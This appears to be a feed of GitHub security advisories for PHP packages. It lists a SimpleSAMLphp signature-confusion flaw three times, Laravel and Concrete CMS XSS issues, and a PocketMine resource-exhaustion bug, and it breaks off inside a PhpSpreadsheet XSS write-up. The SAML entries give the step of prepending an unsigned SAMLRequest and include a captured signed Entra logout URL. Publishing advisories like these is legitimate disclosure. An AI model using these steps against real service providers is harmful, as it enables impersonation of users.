{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There's a signature confusion attack in the HTTPRedirect binding. An attacker with any signed SAMLResponse via the HTTP-Redirect binding can cause the application to accept an unsigned message.</p>\n<p>I believe that it exists for v4 only. I have not yet developed a PoC.</p>\n<p>V5 is well designed and instead builds the signed query from the same message that will be consumed.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"what-is-verified\">What is verified</h4>\n<p>The data['SignedQuery'] is the string that will be verified by the public key. </p>\n<p>It is defined here:\n<a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></p>\n<p>THe code will iterate through each parameter name. Notably, sigQuery is overridden each time when processing, making the last of SAMLRequest/SAMLResponse used for sigQuery.</p>\n<p>For example, given:</p>\n<p>SAMLRequest=a&amp;SAMLResponse=idpsigned</p>\n<p>SAMLResponse=idpsigned will be set as sigQuery, then later verified</p>\n<h4 id=\"what-is-actually-processed\">What is actually processed</h4>\n<p>Processing uses SAMLRequest parameter value first, (if it exists) then SAMLResponse:</p>\n<p><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></p>\n<p>Given this, the contents that are processed might not be the same as the data that is actually verified.</p>\n<h3 id=\"exploiting\">Exploiting</h3>\n<p>Suppose an attacker has a signed HTTP Redirect binding from IdP, say a signed logout response. :</p>\n<p>SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature</p>\n<p>Then an attacker can append SAMLRequest in front:</p>\n<p><code>SAMLRequest=unverifieddata&amp;SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature=..</code></p>\n<p>SimpleSAMLPhp will only verify the SAMLResponse, but will actually use the SAMLRequest contents. The impact here is increased because there's no checks that SAMLRequest actually contains a Request, it could instead contain an Response, which allows the attacker to effectively impersonate any user within the SP.</p>\n<h3 id=\"idps\">IdPs</h3>\n<p>Microsoft Azure AD/Entra (and likely ADFS) signs the LogoutResponse via this SimpleSign format in HTTP Redirect binding. If an attacker logs out of Entra, they will be able to extract a valid Signature.</p>\n<p>Attached is an HTTP Request when an I initiated a SLO request from the service provider to the IdP (entra). Then IdP POSTed this SAMLResponse with HTTP Redirect binding signature, via the user browser to the SP. It should be possible to carry out the described attack with this.</p>\n<pre><code>https://webhook.site/c6038292-6ef5-46ac-973d-d7c25520ec48/logout?SAMLResponse=fVJNa%2bMwEP0rRndZtmw5tnAMy%2fYSaC9N6aGXIsmjVMTRGI9M%2bvObdeihsPQ4w7x5HzM9mcs060c84ZqegWaMBNnhYc%2fejS1UW1TAnVU7XldK8s7JkcvOd60Db3zTsewVFgoY90zmBcsORCscIiUT061VyJqXJS%2fbl7LRUmrZ5mXdvLHsASiFaNKG%2fEhpJi3EFewH4jmnkEC4pqha2UnegFe8bozj3a4a%2bbhzUilZgKtbMW2yb7TxW%2foL7lkM9hTC2XnEOPvZXjDECb2N1lh7mvBsp%2bnsErDs8zJF0lsEe7YuUaOhQDqaC5BOTh%2f%2fPD3qmzE9L5jQ4cSGfrO43KG%2fgwwRLP8ssuHbIiXKryGOeKU8QhLSVN7WteejV8Bru%2bt4WynFbwE3bdVV5ahG0Ys759Dfj3VMJq30s%2fqLI2SvZlrhd020Tevj6hwQMTH04udS8b%2bHGL4A&amp;Signature=Z%2f7gIPv7Gkgvqtwo0bzgXyum9IjHMfP0zTYuNbl%2fBUGlQ%2fU%2bbOZGZJ6Rk9wLUyvNQ5XlZRxZrfESNA%2bn0CVyIedsg9GxQKTi7VqPTJFJqEIP1BZaEpYYP3%2f6sFfLxfTMKecJoQdxnDE5Malte1hMj2UujWnLXOnp0CgO%2f%2fU2K52SoGckIzNDRB%2fJ6%2fysTn%2bDjBrmgdro%2fgdTyby9%2f3vm8dzY8pUkRCgMjlimShrZxr5U33wQvwPLIXlDgActr91RUtWKE0k8sy%2brshrK9DKLPo8AdTLk7NYhjSWdF7OG7uqgEeEo470tacqQuA09E0qDh8CWS%2bycLJijiGYWVyQa4Q%3d%3d&amp;SigAlg=http%3a%2f%2fwww.w3.org%2f2001%2f04%2fxmldsig-more%23rsa-sha256\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56\">https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0\">https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-46r4-f8gj-xg56\">https://github.com/advisories/GHSA-46r4-f8gj-xg56</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-46r4-f8gj-xg56",
            "title": "[simplesamlphp/saml2-legacy] The SimpleSAMLphp SAML2 library incorrectly verifies signatures for HTTP-Redirect binding",
            "date_modified": "2025-03-11T19:23:24.000Z",
            "date_published": "2025-03-11T19:23:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-46r4-f8gj-xg56"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There's a signature confusion attack in the HTTPRedirect binding. An attacker with any signed SAMLResponse via the HTTP-Redirect binding can cause the application to accept an unsigned message.</p>\n<p>I believe that it exists for v4 only. I have not yet developed a PoC.</p>\n<p>V5 is well designed and instead builds the signed query from the same message that will be consumed.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"what-is-verified\">What is verified</h4>\n<p>The data['SignedQuery'] is the string that will be verified by the public key. </p>\n<p>It is defined here:\n<a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></p>\n<p>THe code will iterate through each parameter name. Notably, sigQuery is overridden each time when processing, making the last of SAMLRequest/SAMLResponse used for sigQuery.</p>\n<p>For example, given:</p>\n<p>SAMLRequest=a&amp;SAMLResponse=idpsigned</p>\n<p>SAMLResponse=idpsigned will be set as sigQuery, then later verified</p>\n<h4 id=\"what-is-actually-processed\">What is actually processed</h4>\n<p>Processing uses SAMLRequest parameter value first, (if it exists) then SAMLResponse:</p>\n<p><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></p>\n<p>Given this, the contents that are processed might not be the same as the data that is actually verified.</p>\n<h3 id=\"exploiting\">Exploiting</h3>\n<p>Suppose an attacker has a signed HTTP Redirect binding from IdP, say a signed logout response. :</p>\n<p>SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature</p>\n<p>Then an attacker can append SAMLRequest in front:</p>\n<p><code>SAMLRequest=unverifieddata&amp;SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature=..</code></p>\n<p>SimpleSAMLPhp will only verify the SAMLResponse, but will actually use the SAMLRequest contents. The impact here is increased because there's no checks that SAMLRequest actually contains a Request, it could instead contain an Response, which allows the attacker to effectively impersonate any user within the SP.</p>\n<h3 id=\"idps\">IdPs</h3>\n<p>Microsoft Azure AD/Entra (and likely ADFS) signs the LogoutResponse via this SimpleSign format in HTTP Redirect binding. If an attacker logs out of Entra, they will be able to extract a valid Signature.</p>\n<p>Attached is an HTTP Request when an I initiated a SLO request from the service provider to the IdP (entra). Then IdP POSTed this SAMLResponse with HTTP Redirect binding signature, via the user browser to the SP. It should be possible to carry out the described attack with this.</p>\n<pre><code>https://webhook.site/c6038292-6ef5-46ac-973d-d7c25520ec48/logout?SAMLResponse=fVJNa%2bMwEP0rRndZtmw5tnAMy%2fYSaC9N6aGXIsmjVMTRGI9M%2bvObdeihsPQ4w7x5HzM9mcs060c84ZqegWaMBNnhYc%2fejS1UW1TAnVU7XldK8s7JkcvOd60Db3zTsewVFgoY90zmBcsORCscIiUT061VyJqXJS%2fbl7LRUmrZ5mXdvLHsASiFaNKG%2fEhpJi3EFewH4jmnkEC4pqha2UnegFe8bozj3a4a%2bbhzUilZgKtbMW2yb7TxW%2foL7lkM9hTC2XnEOPvZXjDECb2N1lh7mvBsp%2bnsErDs8zJF0lsEe7YuUaOhQDqaC5BOTh%2f%2fPD3qmzE9L5jQ4cSGfrO43KG%2fgwwRLP8ssuHbIiXKryGOeKU8QhLSVN7WteejV8Bru%2bt4WynFbwE3bdVV5ahG0Ys759Dfj3VMJq30s%2fqLI2SvZlrhd020Tevj6hwQMTH04udS8b%2bHGL4A&amp;Signature=Z%2f7gIPv7Gkgvqtwo0bzgXyum9IjHMfP0zTYuNbl%2fBUGlQ%2fU%2bbOZGZJ6Rk9wLUyvNQ5XlZRxZrfESNA%2bn0CVyIedsg9GxQKTi7VqPTJFJqEIP1BZaEpYYP3%2f6sFfLxfTMKecJoQdxnDE5Malte1hMj2UujWnLXOnp0CgO%2f%2fU2K52SoGckIzNDRB%2fJ6%2fysTn%2bDjBrmgdro%2fgdTyby9%2f3vm8dzY8pUkRCgMjlimShrZxr5U33wQvwPLIXlDgActr91RUtWKE0k8sy%2brshrK9DKLPo8AdTLk7NYhjSWdF7OG7uqgEeEo470tacqQuA09E0qDh8CWS%2bycLJijiGYWVyQa4Q%3d%3d&amp;SigAlg=http%3a%2f%2fwww.w3.org%2f2001%2f04%2fxmldsig-more%23rsa-sha256\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56\">https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0\">https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-46r4-f8gj-xg56\">https://github.com/advisories/GHSA-46r4-f8gj-xg56</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-46r4-f8gj-xg56",
            "title": "[simplesamlphp/saml2] The SimpleSAMLphp SAML2 library incorrectly verifies signatures for HTTP-Redirect binding",
            "date_modified": "2025-03-11T19:23:24.000Z",
            "date_published": "2025-03-11T19:23:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-46r4-f8gj-xg56"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There's a signature confusion attack in the HTTPRedirect binding. An attacker with any signed SAMLResponse via the HTTP-Redirect binding can cause the application to accept an unsigned message.</p>\n<p>I believe that it exists for v4 only. I have not yet developed a PoC.</p>\n<p>V5 is well designed and instead builds the signed query from the same message that will be consumed.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"what-is-verified\">What is verified</h4>\n<p>The data['SignedQuery'] is the string that will be verified by the public key. </p>\n<p>It is defined here:\n<a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></p>\n<p>THe code will iterate through each parameter name. Notably, sigQuery is overridden each time when processing, making the last of SAMLRequest/SAMLResponse used for sigQuery.</p>\n<p>For example, given:</p>\n<p>SAMLRequest=a&amp;SAMLResponse=idpsigned</p>\n<p>SAMLResponse=idpsigned will be set as sigQuery, then later verified</p>\n<h4 id=\"what-is-actually-processed\">What is actually processed</h4>\n<p>Processing uses SAMLRequest parameter value first, (if it exists) then SAMLResponse:</p>\n<p><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></p>\n<p>Given this, the contents that are processed might not be the same as the data that is actually verified.</p>\n<h3 id=\"exploiting\">Exploiting</h3>\n<p>Suppose an attacker has a signed HTTP Redirect binding from IdP, say a signed logout response. :</p>\n<p>SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature</p>\n<p>Then an attacker can append SAMLRequest in front:</p>\n<p><code>SAMLRequest=unverifieddata&amp;SAMLResponse=idpsigned&amp;RelayState=...&amp;SigAlg=...&amp;Signature=..</code></p>\n<p>SimpleSAMLPhp will only verify the SAMLResponse, but will actually use the SAMLRequest contents. The impact here is increased because there's no checks that SAMLRequest actually contains a Request, it could instead contain an Response, which allows the attacker to effectively impersonate any user within the SP.</p>\n<h3 id=\"idps\">IdPs</h3>\n<p>Microsoft Azure AD/Entra (and likely ADFS) signs the LogoutResponse via this SimpleSign format in HTTP Redirect binding. If an attacker logs out of Entra, they will be able to extract a valid Signature.</p>\n<p>Attached is an HTTP Request when an I initiated a SLO request from the service provider to the IdP (entra). Then IdP POSTed this SAMLResponse with HTTP Redirect binding signature, via the user browser to the SP. It should be possible to carry out the described attack with this.</p>\n<pre><code>https://webhook.site/c6038292-6ef5-46ac-973d-d7c25520ec48/logout?SAMLResponse=fVJNa%2bMwEP0rRndZtmw5tnAMy%2fYSaC9N6aGXIsmjVMTRGI9M%2bvObdeihsPQ4w7x5HzM9mcs060c84ZqegWaMBNnhYc%2fejS1UW1TAnVU7XldK8s7JkcvOd60Db3zTsewVFgoY90zmBcsORCscIiUT061VyJqXJS%2fbl7LRUmrZ5mXdvLHsASiFaNKG%2fEhpJi3EFewH4jmnkEC4pqha2UnegFe8bozj3a4a%2bbhzUilZgKtbMW2yb7TxW%2foL7lkM9hTC2XnEOPvZXjDECb2N1lh7mvBsp%2bnsErDs8zJF0lsEe7YuUaOhQDqaC5BOTh%2f%2fPD3qmzE9L5jQ4cSGfrO43KG%2fgwwRLP8ssuHbIiXKryGOeKU8QhLSVN7WteejV8Bru%2bt4WynFbwE3bdVV5ahG0Ys759Dfj3VMJq30s%2fqLI2SvZlrhd020Tevj6hwQMTH04udS8b%2bHGL4A&amp;Signature=Z%2f7gIPv7Gkgvqtwo0bzgXyum9IjHMfP0zTYuNbl%2fBUGlQ%2fU%2bbOZGZJ6Rk9wLUyvNQ5XlZRxZrfESNA%2bn0CVyIedsg9GxQKTi7VqPTJFJqEIP1BZaEpYYP3%2f6sFfLxfTMKecJoQdxnDE5Malte1hMj2UujWnLXOnp0CgO%2f%2fU2K52SoGckIzNDRB%2fJ6%2fysTn%2bDjBrmgdro%2fgdTyby9%2f3vm8dzY8pUkRCgMjlimShrZxr5U33wQvwPLIXlDgActr91RUtWKE0k8sy%2brshrK9DKLPo8AdTLk7NYhjSWdF7OG7uqgEeEo470tacqQuA09E0qDh8CWS%2bycLJijiGYWVyQa4Q%3d%3d&amp;SigAlg=http%3a%2f%2fwww.w3.org%2f2001%2f04%2fxmldsig-more%23rsa-sha256\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56\">https://github.com/simplesamlphp/saml2/security/advisories/GHSA-46r4-f8gj-xg56</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0\">https://github.com/simplesamlphp/saml2/commit/7867d6099dc7f31bed1ea10e5bea159c5623d2a0</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L104-L113</a></li>\n<li><a href=\"https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217\">https://github.com/simplesamlphp/saml2/blob/9545abd0d9d48388f2fa00469c5c1e0294f0303e/src/SAML2/HTTPRedirect.php#L178-L217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-46r4-f8gj-xg56\">https://github.com/advisories/GHSA-46r4-f8gj-xg56</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-46r4-f8gj-xg56",
            "title": "[simplesamlphp/saml2] The SimpleSAMLphp SAML2 library incorrectly verifies signatures for HTTP-Redirect binding",
            "date_modified": "2025-03-11T19:23:24.000Z",
            "date_published": "2025-03-11T19:23:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-46r4-f8gj-xg56"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Laravel framework versions between 11.9.0 and 11.35.1 are susceptible to reflected cross-site scripting due to an improper encoding of request parameters in the debug-mode error page.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-13918\">https://nvd.nist.gov/vuln/detail/CVE-2024-13918</a></li>\n<li><a href=\"https://github.com/laravel/framework/pull/53869\">https://github.com/laravel/framework/pull/53869</a></li>\n<li><a href=\"https://github.com/laravel/framework/releases/tag/v11.36.0\">https://github.com/laravel/framework/releases/tag/v11.36.0</a></li>\n<li><a href=\"https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-01_Laravel_Reflected_XSS_via_Request_Parameter_in_Debug-Mode_Error_Page\">https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-01_Laravel_Reflected_XSS_via_Request_Parameter_in_Debug-Mode_Error_Page</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/10/3\">http://www.openwall.com/lists/oss-security/2025/03/10/3</a></li>\n<li><a href=\"https://github.com/laravel/framework/commit/45287fb2a91c69bb1c110539b9b7341faf5aee33\">https://github.com/laravel/framework/commit/45287fb2a91c69bb1c110539b9b7341faf5aee33</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/laravel/framework/CVE-2024-13918.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/laravel/framework/CVE-2024-13918.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-546h-56qp-8jmw\">https://github.com/advisories/GHSA-546h-56qp-8jmw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-546h-56qp-8jmw",
            "title": "[laravel/framework] Laravel framework susceptible to reflected cross-site scripting",
            "date_modified": "2025-03-11T14:31:26.000Z",
            "date_published": "2025-03-10T12:30:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-546h-56qp-8jmw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Concrete CMS versions 9.0.0 through 9.3.9 are affected by a stored XSS in Folder Function.The \"Add Folder\" functionality lacks input sanitization, allowing a rogue admin to inject XSS payloads as folder names.&nbsp;&nbsp;The Concrete CMS security team gave this vulnerability a CVSS 4.0 Score of 4.8 with vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:P/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N. Versions below 9 are not affected. Thanks, Alfin Joseph&nbsp;for reporting.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0660\">https://nvd.nist.gov/vuln/detail/CVE-2025-0660</a></li>\n<li><a href=\"https://github.com/concretecms/bedrock/pull/370\">https://github.com/concretecms/bedrock/pull/370</a></li>\n<li><a href=\"https://github.com/concretecms/concretecms/pull/12454\">https://github.com/concretecms/concretecms/pull/12454</a></li>\n<li><a href=\"https://documentation.concretecms.org/9-x/developers/introduction/version-history/940-release-notes\">https://documentation.concretecms.org/9-x/developers/introduction/version-history/940-release-notes</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pvmx-mjmh-jfcx\">https://github.com/advisories/GHSA-pvmx-mjmh-jfcx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pvmx-mjmh-jfcx",
            "title": "[concrete5/concrete5] Concrete CMS affected by a stored XSS in Folder Function.The \"Add Folder\" functionality",
            "date_modified": "2025-03-10T22:26:18.000Z",
            "date_published": "2025-03-10T21:31:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pvmx-mjmh-jfcx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Laravel framework versions between 11.9.0 and 11.35.1 are susceptible to reflected cross-site scripting due to an improper encoding of route parameters in the debug-mode error page.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-13919\">https://nvd.nist.gov/vuln/detail/CVE-2024-13919</a></li>\n<li><a href=\"https://github.com/laravel/framework/pull/53869\">https://github.com/laravel/framework/pull/53869</a></li>\n<li><a href=\"https://github.com/laravel/framework/releases/tag/v11.36.0\">https://github.com/laravel/framework/releases/tag/v11.36.0</a></li>\n<li><a href=\"https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-02_Laravel_Reflected_XSS_via_Route_Parameter_in_Debug-Mode_Error_Page\">https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-02_Laravel_Reflected_XSS_via_Route_Parameter_in_Debug-Mode_Error_Page</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/10/4\">http://www.openwall.com/lists/oss-security/2025/03/10/4</a></li>\n<li><a href=\"https://github.com/laravel/framework/commit/45287fb2a91c69bb1c110539b9b7341faf5aee33\">https://github.com/laravel/framework/commit/45287fb2a91c69bb1c110539b9b7341faf5aee33</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-83wp-f5c3-hqqr\">https://github.com/advisories/GHSA-83wp-f5c3-hqqr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-83wp-f5c3-hqqr",
            "title": "[laravel/framework] Laravel framework susceptible to reflected cross-site scripting",
            "date_modified": "2025-03-10T20:51:20.000Z",
            "date_published": "2025-03-10T12:30:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-83wp-f5c3-hqqr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Due to lack of limits by default in the <a href=\"https://www.php.net/manual/en/function.explode.php\"><code>explode()</code></a> function, malicious clients were able to abuse some packets to waste server CPU and memory.</p>\n<p>This is similar to a previous security issue published in <a href=\"https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-gj94-v4p9-w672\">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-gj94-v4p9-w672</a>, but with a wider impact, including but not limited to:</p>\n<ul>\n<li>Sign editing</li>\n<li>LoginPacket JWT parsing</li>\n<li>Command parsing</li>\n</ul>\n<p>However, the estimated impact of these issues is low, due to other limits such as the packet decompression limit.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue was fixed in 5.25.2 via d0d84d4c5195fb0a68ea7725424fda63b85cd831.</p>\n<p>A custom PHPStan rule has also been introduced to the project, which will henceforth require that all calls to <code>explode()</code> within the codebase must specify the <code>limit</code> parameter.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No simple way to fix this.\nGiven that sign editing is the easiest way this could be exploited, workarounds could include plugins pre-processing <code>BlockActorDataPacket</code> to check that the incoming text doesn't have more than 4 parts when split by <code>\\n</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-g274-c6jj-h78p\">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-g274-c6jj-h78p</a></li>\n<li><a href=\"https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-gj94-v4p9-w672\">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-gj94-v4p9-w672</a></li>\n<li><a href=\"https://github.com/pmmp/PocketMine-MP/commit/d0d84d4c5195fb0a68ea7725424fda63b85cd831\">https://github.com/pmmp/PocketMine-MP/commit/d0d84d4c5195fb0a68ea7725424fda63b85cd831</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g274-c6jj-h78p\">https://github.com/advisories/GHSA-g274-c6jj-h78p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g274-c6jj-h78p",
            "title": "[pocketmine/pocketmine-mp] PocketMine-MP allows malicious client data to waste server resources due to lack of limits for explode()",
            "date_modified": "2025-03-10T20:29:26.000Z",
            "date_published": "2025-03-10T20:29:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g274-c6jj-h78p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Product:</strong> PhpSpreadsheet\n<strong>Version:</strong> 3.8.0\n<strong>CWE-ID:</strong> CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1:</strong> 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0:</strong> 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description:</strong> an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link\n<strong>Impact:</strong> executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component:</strong> class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateRow</code>\n<strong>Exploitation conditions:</strong> a user viewing a specially generated xml file\n<strong>Mitigation:</strong> additional sanitization of special characters in a string\n<strong>Researcher: Igor Sak-Sakovskiy (Positive Technologies)</strong></p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.\nThe following code is written on the server, which translates the XML file into an HTML representation and displays it in the response.</p>\n<p><em>Listing 4. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileType = 'Xml';\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);  \n\n$inputFileName = './doc/file.xml';\n$spreadsheet = $reader-&gt;load($inputFileName); \n \n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet); \nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>The contents of the xml file - <code>./doc/file.xml</code></p>\n<p><em>Listing 5. The contents of the xml file</em></p>\n<pre><code>&lt;?xml version=\"1.0\"?&gt; \n&lt;?mso-application progid=\"Excel.Sheet\"?&gt; \n&lt;Workbook xmlns=\"urn:schemas-microsoft-com:office:spreadsheet\" \n xmlns:o=\"urn:schemas-microsoft-com:office:office\" \n xmlns:x=\"urn:schemas-microsoft-com:office:excel\" \n xmlns:ss=\"urn:schemas-microsoft-com:office:spreadsheet\" \n xmlns:html=\"http://www.w3.org/TR/REC-html40\"&gt; \n &lt;DocumentProperties xmlns=\"urn:schemas-microsoft-com:office:office\"&gt; \n  &lt;Author&gt;author&lt;/Author&gt; \n  &lt;LastAuthor&gt;author&lt;/LastAuthor&gt; \n  